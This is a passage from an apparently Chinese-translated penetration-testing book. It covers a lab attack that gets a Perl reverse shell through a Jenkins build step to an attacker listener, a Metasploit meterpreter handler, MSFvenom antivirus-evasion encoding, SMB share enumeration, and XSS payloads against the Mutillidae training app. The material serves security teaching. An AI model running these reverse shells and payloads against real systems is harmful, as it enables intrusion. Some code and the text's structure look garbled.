  \ `Freestyle` 项目，最后点击 OK（参见图 7.22）。\n\n![Jenkins - 新项目截图。](img/c07f022.png)\n\n\
  图 7.22 Jenkins ‐ 新项目\n\n一旦你进入项目配置页面，滚动到 `Build` 部分并选择 `Execute Shell` 菜单项（参见图 7.23）。\n\
  \n![Jenkins – 添加构建步骤截图。](img/c07f023.png)\n\n图 7.23 Jenkins – 添加构建步骤\n\n我们从枚举阶段知道该主机是基于\
  \ Linux 的，因此我们将使用 Perl 来执行反向 shell 命令（记住我们在 Kali 主机的 `1111` 端口上有一个监听器）。我们不会执行 `netcat`，因为这是一生产服务器，管理员没有安装它；这就是为什么我们将使用\
  \ Perl 来完成工作（因为 Ubuntu/Linux 上通常都安装了），如图 7.24](#c07.xhtml_c07-fig-0024) 所示：\n\n\
  ```\nperl -e 'use Socket;$i=\"172.16.0.102\";$p=1111;socket(S,PF_INET,SOCK_STREAM,getobyname(\"\
  tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))){open(STDIN,S\");open(STDOUT,S\"\
  );open(STDERR,S\");exec(\"/bin/sh -i\");'\n```\n\n点击 Save 后，窗口将关闭。现在，我们只需要执行命令。为此，点击左侧菜单中的\
  \ `Build`。执行后：\n```bash\nconnected to 172.16.0.102\nroot@ub01:~#\n```\n\n\n\n\n\n\
  ```\nmsf5> use exploit/multi/handler\nmsf5 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp\n\
  msf5 exploit(multi/handler)> set LPORT 1111 \nmsf5 exploit(multi/handler)> exploit\
  \ \n```\n\n在此阶段，我们只需要将此有效负载（`shell.exe`）传输到我们的 Windows 受害者主机并运行它。一旦执行了它，我们应该就会获得一个\
  \ Meterpreter shell：\n\n```\n[*] Started reverse TCP handler on 172.16.0.102:1111\
  \ \n[*] Sending stage (176195 bytes) to 172.16.0.100\n[*] Meterpreter session 1\
  \ opened (172.16.0.102:1111 -> 172.16.0.100:49177) at 2020-06-27 12:39:30 -0400\n\
  \nmeterpreter >\n```\n\n在本书的后续章节中，你将学习如何在此阶段之后使用 Meterpreter 进行权限提升和跳板攻击。\n\n##\
  \ MSFvenom 选项\n\n为了更好地管理 MSFvenom，你需要掌握它的选项。以下是一个典型的命令模板：\n\n```\n$msfvenom -p [payload\
  \ name] – platform [Operating System] -e [encoder] -f [format] –out [output file\
  \ name]\n```\n\n要列出所有支持的有效负载，请使用以下命令（使用 `grep` 命令过滤结果）：\n\n```\n$msfvenom -l payloads\n\
  ```\n\n要列出所有支持的平台（例如 Windows、Linux 等），请使用：\n\n```\n$msfvenom -l platforms\n```\n\
  \n要列出所有支持的编码器（用于绕过反病毒软件），请使用：\n\n```\n$msfvenom -l encoders\n```\n\n你还可以使用 `-i`\
  \ 标志对有效负载进行多次编码。有时，多次迭代有助于规避反病毒保护，但要记住，编码并不是为了作为真正的防病毒规避方案：\n\n```\n$msfvenom -p\
  \ windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3\n```\n\n最后，要列出 MSFvenom\
  \ 支持的所有文件格式，请使用：\n\n```\n$msfvenom --help-formats\n```\n\n## 利用 SMB 协议\n\nSamba\
  \ 协议在过去几年中一直是一个非常流行的可利用的服务。Metasploit 中的主要漏洞利用与 SMB 漏洞有关。\n\n### 连接到 SMB 共享\n\n\
  一旦在枚举阶段发现端口 445 是开启的，你就可以通过尝试连接这些目录来继续操作。\n\n要列出远程主机上的共享文件夹，让我们使用 Metasploit 的 `smb_enumshares`\
  \ 模块：\n\n```\nmsf5> use auxiliary/scanner/smb/smb_enumshares\nmsf5 auxiliary(scanner/smb/smb_enumshares)>\
  \ set RHOSTS 172.16.0.100\nRHOSTS => 172.16.0.100\nmsf5 auxiliary(scanner/smb/smb_enumshares)>\
  \ set SMBUser admin\nSMBUser => admin\nmsf5 auxiliary(scanner/smb/smb_enumshares)>\
  \ set SMBPass admin\nSMBPass => admin\nmsf5 auxiliary(scanner/smb/smb_enumshares)>\
  \ run\n[+] 172.16.0.100:445 - ADMIN$ ‐ (DISK) Remote Admin\n[+] 172.16.0.100:445\
  \ - C ‐ (DISK)\n[+] 172.16.0.100:445 - C$ ‐ (DISK) Default share\n[+] 172.16.0.100:445\
  \ - IPC$ ‐ (IPC) Remote IPC\n[*] 172.16.0.100: - Scanned 1 of 1 hosts (100% complete)\n\
  [*] Auxiliary module execution completed\n```\n\n我们在之前的 Windows 主机中发现了四个共享目录。\n\n\
  在 Kali 中，你可以使用操作系统的文件夹管理器远程访问 SMB 共享。请确保在你的 Kali 文件管理器中输入以下路径（请参见图 7.25）：\n\n![SMB\
  \ 连接的截图](img/c07f025.png)\n\n图 7.25 SMB 连接\n\n```\nsmb://[IP address]\n```\n\n一旦你输入正确的\
  \ IP 地址，系统将要求输入凭据（在我的情况下，是 admin:admin）。当你点击“连接”按钮时，你将拥有远程共享的完全视觉访问（请参见图 7.26）。\n\
  \n![SMB 连接建立的截图](img/c07f026.png)\n\n图 7.26 SMB 连接建立\n\n### SMB Eternal Blue 漏洞\n\
  \n我们之所以选择这个主题作为示例是有原因的。Eternal Blue（永恒蓝）漏洞几年前非常流行，微软已经修复了它。\n\n\n\n\n\n# 4. 安装与设置数据库\n\
  \n## Apache Web 服务器安装\n\n首先，安装一个 Apache Web 服务器来托管网站。在本书的这一阶段，你应该已经能够处理终端命令了：\n\n\
  ```bash\n$apt update && apt upgrade -y\n$apt install -y apache2 apache2-utils\n\
  $a2enmod rewrite\n$systemctl restart apache2\n$systemctl enable apache2\n```\n\n\
  ## 防火墙设置\n\n我们不希望 Ubuntu 防火墙在测试期间阻止 HTTP 通。Ubuntu Linux 上预装了两种类型的防火墙：\n\n* `iptables`\n\
  * `ufw`\n\n让我们执行两条命令来更改（解锁）每种类型的防火墙（为了保险起见）：\n\n```bash\n$iptables -I INPUT -p tcp\
  \ --dport 80 -j ACCEPT\n$ufw allow http\n```\n\n## 安装 PHP\n\nPHP 是构建该网站的编程语言。因此，我们需要安装该框架以便在\
  \ Ubuntu 主机上运行源代码：\n\n```bash\n$apt install -y php7.4 libapache2-mod-php7.4 php7.4-mysql\
  \ php-common php7.4-cli php7.4-common php7.4-json php7.4-opcache php7.4-readline\
  \ php7.4-curl php7.4-mbstring php7.4-xml\n```\n\n## 安装与设置\n\n网站数据需要存储在数据库中。Mutillidae\
  \ 将数据保存到 MySQL 数据库中。我们将安装基于 MySQL 引擎的 MariaDB：\n\n```bash\n$apt install mariadb-server\
  \ mariadb-client -y\n$systemctl enable mariadb\n```\n\n为了允许 Web 访问此数据库，我们需要更新 root\
  \ 数据库用户的权限。为了完成任务，我们将执行以下命令（注意，一旦执行第一条命令，你将进入 MySQL 交互式命令行）：\n\n```bash\n$mysql\
  \ -u root\n>use mysql;\n>update user set authentication_string=PASSWORD('mutillidae')\
  \ where user='root';\n>update user set plugin='mysql_native_password' where user='root';\n\
  >flush privileges;\n>exit\n```\n\n根据前面的命令，我们将用户密码从 `root` 更改为了 `mutillidae`。\n\n\
  ## Mutillidae 安装\n\n现在我们已经安装了所有组件，需要从 GitHub 下载网站的二进制文件。此外，我们还需要 Web 服务器目录 `/var/www/html`\
  \ 下创建一个 `mutillidae` 文件夹：\n\n```bash\n$cd /var/www/html/\n$apt install git -y\n\
  $git clone https://github.com/webpwnized/mutillidae.git mutillidae\n$systemctl restart\
  \ apache2\n```\n\n要打开 Mutillidae Web 应用程序，请在 Ubuntu 服务器上打开浏览器并访问 `localhost/mutillidae`，如图\
  \ 8.1 所示。\n\n![Mutillidae 首页截图。](img/c08f001.png)\n\n图 8.1 Mutillidae 首页\n\n第一次访问该站点时，你会收到数据库离线的通知。点击\
  \ Setup/Reset The DB 链接，你将被重定向到 Reset DB 页面。接下来，你会看到一个弹出消息。点击 OK 继续。\n\n## 跨站脚本\n\
  \n跨站脚本 (XSS) 是一种漏洞，通过在受者的客户端浏览器上执行客户端脚本（例如 JavaScript）可以被利用。当应用程序开发者没有在后端正确验证输入数据时，就会存在此漏洞。每当你看到网页上可以通过用户输入进行操作的文本时，意味着它极有可能受到\
  \ XSS 攻击。如果你现在不理解这一点，不要担心；我们将一起练习。以下是涉及 XSS 的两种常见场景：\n\n* 反射型 XSS (Reflected XSS)\n\
  * 存储型 XSS (Stored XSS)\n\n### 反射型 XSS\n\n反射型 XSS 漏洞可以通过操纵任何输入（例如 URL、文本框、隐藏字段等）在客户端浏览器上执行\
  \ JavaScript。为了练习这种场景，请选择 OWASP 2017 ➪ A7 – Cross Site Scripting (XSS) ➪ Reflected\
  \ (First Order) ➪ DNS Lookup。在该页面上，你只需尝试获取你在文本框中提供的 IP 地址背后的 DNS 名称。接下来，输入 `172.16.0.1`\
  \ 作为路由器的 IP 地址并点击 Lookup DNS 按钮。\n\n仔细查看图 8.2 所示的输出结果。`172.16.0.1` 的消息结果中打印出了 IP\
  \ 地址。换句话说，我们使用了文本框（一个用户输入字段），它被打印在了页面上。\n\n![Mutillidae – DNS 查询截图。](img/c08f002.png)\n\
  \n图 8.2 Mutillidae – DNS 查询\n\n接下来，我们将文本框中的 IP 地址替换为某些 JavaScript 代码。如果代码执行，则该页面容易受到反射型\
  \ XSS 攻击。\n\n注入一个简单的 JavaScript 弹出消息，如下：\n\n```javascript\n<script> alert('Hello\
  \ KCorp') </script>\n```\n\n如果有效，你就可以按照自己的意愿执行任何恶意 JavaScript。事实上，Kali Linux 拥有一个完整的\
  \ XSS JavaScript 库框架；查看一下浏览器利用框架 (BeEF)。\n\n现在如果我们点击 Lookup DNS 按钮，脚本将执行，并且弹出警框将显示图\
  \ 8.3 中的消息。\n\n![Mutillidae – 脚本警报截图。](img/c08f003.png)\n\n图 8.3 Mutillidae – 脚本警报\n\
  \n为了让攻击生效，你需要说服受害者点击受漏洞页面。在这种情况下，用户需要通过某种高级的社交工程攻击（例如钓鱼邮件）来中上饵。\n\n### 存储型 XSS\n\
  \n存储型 XSS 与反射型类似（它们都会执行 JavaScript 负载）。唯一的区别是，存储型 XSS 会将 JavaScript 保存到存储系统中（例如数据库）。\n\
  \n为了练习这种场景，请选择 OWASP 2017 ➪ A7 – Cross Site Scripting (XSS) ➪ Persistent (Second\
  \ Order) ➪ Add To Blog。打开的页面允许你保存博客文章。任何访问该页的用户都会被感染。\n\n```javascript\n<script>\
  \ alert('XSS')</script>\n```\n\n点击 Save（参见图 8.4）。\n\n![Mutillidae – 博客文章截图。](img/c08f004.png)\n\
  \n图 8.4 Mutillidae – 博客文章\n\n### 使用 Header 利用 XSS\n\n向页面注入 JavaScript 的另一种方法是通过请求头\
  \ (Header)。如果管理员为了审核和记录保存了每个请求，那么你就可以利用这种行为，但如何操作呢？如果 JavaScript 被保存在 Header 中，那么当管理员访问日志时，JavaScript\
  \ 就会执行。为了练习这种场景，我们将使用 Log 页面，如图 8.5 所示。\n\n![Mutillidae - 日志截图。](img/c08f005.png)\n\
  \n图 8.5 Mutillidae - 日志\n\n此页面将出于日志显示此 Web 应用程序每个 Web 请求的头。第三列显示了请求头中的浏览器代理（Agent）。\n\
  \n让我们使用 Burp 拦截请求并更改浏览器代理。你在枚举阶段已经看到过如何准备 Burp 进行拦截的示例。为了让其工作，我们需要以下内容：\n\n* 浏览器需要使用代理（端口\
  \ `8080`）。\n* 我们需要加载 Burp 并确保打开 Proxy 选项卡，然后是 Intercept 子选项卡，那里有一个 `Intercept` 按钮。\n\
  \n让我们使用首页访问 Mutillidae 上的任何网页，并使用 Burp 拦截它（参见图 8.6）。\n\n![Burp suite – Proxy Intercept\
  \ 截图。](img/c08f006.png)\n\n图 8.6 Burp suite – Proxy Intercept\n\n\n\n\n\n修改 `User-Agent`\
  \ 值，将其替换为 JavaScript 警告消息（参见图 8.7），并点击前进（Forward）按钮。点击前进后，通知 Burp 停止拦截。要实现这一点，点击\
  \ `Intercept Is On` 按钮将其关闭（否则网页将无法加载；它将一直等待你的输入）。请注意，当你从此窗口停止拦截时，Burp 将继续在后台拦截，而不会停止来自你浏览器的请求/响应。\n\
  \n![Burp Suite 截图 – User-Agent 编辑。](img/c08f007.png)\n\n图 8.7 Burp Suite – User-Agent\
  \ 编辑\n\n当我们回到日志页面时，应该会看到一个 JavaScript 弹窗警告。\n\n记住，我们在这里所做的是存储型 XSS；日志存储在数据库中，以便管理员随时随地读取它们。\n\
  \n## 绕过 JavaScript 验证\n\nJavaScript 验证是初级开发者的一个误区。他们在前端 JavaScript 代码中添加了验证，但没有在后端实现。（在我们的案例中，后端是\
  \ PHP。）Burp Suite 将再次出现并救场，允许我们拦截请求并注入我们的有效荷。要启用此安全功能（JavaScript 验证），我们将点击顶部菜单项\
  \ `Toggle Security`。一旦安全级别被设置为 1，我们将尝试在之前使用的 DNS 查找页面中注入 `Hello` JavaScript 代码。这次，页面将不会执行该\
  \ JavaScript 代码，并且会向我们显示一条说不允许允许的消息，如图 8.8 所示（因为因为前端代码中存在验证）。\n\n![Mutillidae 截图\
  \ – 错误字符错误消息。](img/c08f008.png)\n\n图 8.8 Mutillidae – 错误字符错误消息\n\n为了绕过 JavaScript\
  \ 验证，我们将使用 Burp 启动拦截。接下来，我们将输入有效的 IP 地址（8.8.8.8，如图 8.9 所示）并点击 `Lookup DNS` 按钮。如果我们切换到\
  \ Burp Proxy 标签页，应该能看到该请求。\n\n我们可以在 `POST` 请求内容中看到 IP 地址。在这个阶段，我们只需要将 IP 地址替换为测试脚本即可，如图\
  \ 8.10 所示。\n\n进行更改后，点击前进按钮并通过点击 `Intercept Is On` 按钮停止拦截。当我们切换到 DNS 查找网页时，我们应该能看到\
  \ JavaScript 已成功执行。为什么会发生这种情况？这仅仅是因为 PHP 代码中没有验证（仅前端 JavaScript 的验证是不够的！）。\n\n![Burp\
  \ Suite 截图 – 拦截有效荷。](img/c08f009.png)\n\n图 8.9 Burp Suite – 拦截有效荷\n\n![Burp Suite\
  \ 截图 – 目标主机脚本。](img/c08f010.png)\n\n图 8.10 Burp Suite – 目标主机脚本\n\n## SQL 注入\n\n\
  SQL 注入（SQLi）是我最喜欢的 Web 漏洞，也是最危险的一种。SQLi 允许恶意用户通过浏览器执行 SQL 命令。你可以使用 SQL 命令做很多事情，例如：\n\
  \n*   使用 `select` 命令查询数据库（例如，你可以选择所有用户记录并窃取机密信息）\n*   通过 SQL 中的 `true` 语句绕过登录页面\n\
  *   执行系统命令并获得远程 shell，例如\n*   使用 `insert` / `delete` / `update` SQL 命令操纵数据\n\n###\
  \ 查询数据库\n\n在我们利用此漏洞之前，让我给你们展示几个 SQL 查询。这个有漏洞的 Web 应用程序创建名为 `mutillidae` 的数据库，在该数据库中，有一个名为\
  \ `accounts` 的表（参见图 8.11）。\n\n从一个简单的命令开始，我们将查询已经在 Web 应用程序中创建的用户名 `test`。我们将使用 `DBeaver`\
